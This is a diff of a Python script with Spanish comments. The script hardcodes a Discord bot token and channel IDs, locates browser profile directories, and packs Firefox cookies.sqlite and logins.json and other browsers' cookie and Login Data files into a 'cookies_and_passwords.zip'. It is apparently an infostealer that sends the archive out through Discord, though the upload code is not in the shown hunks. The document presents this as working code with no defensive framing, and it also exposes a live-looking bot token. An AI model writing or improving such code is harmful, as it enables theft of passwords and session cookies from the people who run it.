@@ -6,7 +6,6 @@ import json
 import discord
 from discord.ext import commands
 
-
 TOKEN = "MTMxMDk4NDgxNjA0MDIxNDU4OQ.GOvKp2.20cJ3Kkm1dg0tiNTvfsHX9c4v-HdHPCepCZHIQ"
 GUILD_ID = 870347825937018882
 CHANNEL_ID = 1310986733093130261
@@ -29,7 +28,7 @@ def get_browser_data_paths():
     detected_paths = {name: path for name, path in paths.items() if os.path.exists(path)}
     return detected_paths
 
-# Función para crear un archivo ZIP con los archivos de cookies y contraseñas
+# Función para copiar los archivos directamente a un ZIP
 def create_zip_file(data_paths, zip_name="cookies_and_passwords.zip"):
     with zipfile.ZipFile(zip_name, 'w') as zipf:
         for name, path in data_paths.items():
@@ -37,7 +36,7 @@ def create_zip_file(data_paths, zip_name="cookies_and_passwords.zip"):
                 # Firefox requiere detección de perfiles
                 profile_dirs = [d for d in os.listdir(path) if os.path.isdir(os.path.join(path, d))]
                 if profile_dirs:
-                    # Añadir cookies.sqlite y logins.json
+                    # Copiar cookies.sqlite y logins.json
                     path_cookies = os.path.join(path, profile_dirs[0], "cookies.sqlite")
                     path_logins = os.path.join(path, profile_dirs[0], "logins.json")
                     if os.path.exists(path_cookies):
@@ -45,9 +44,14 @@ def create_zip_file(data_paths, zip_name="cookies_and_passwords.zip"):
                     if os.path.exists(path_logins):
                         zipf.write(path_logins, "firefox_logins.json")
             else:
-                # Añadir cookies y login data para otros navegadores
+                # Copiar cookies tal como están y renombrar Login Data como .sqlite
                 if os.path.exists(path):
-                    zipf.write(path, f"{name}.sqlite")
+                    if 'login' in name.lower():
+                        # Si el archivo es de login, renombramos a .sqlite
+                        zipf.write(path, f"{name}.sqlite")
+                    else:
+                        # Copiar cookies tal cual
+                        zipf.write(path, f"{name}")
     print(f"Archivo ZIP creado: {zip_name}")
     return zip_name
 
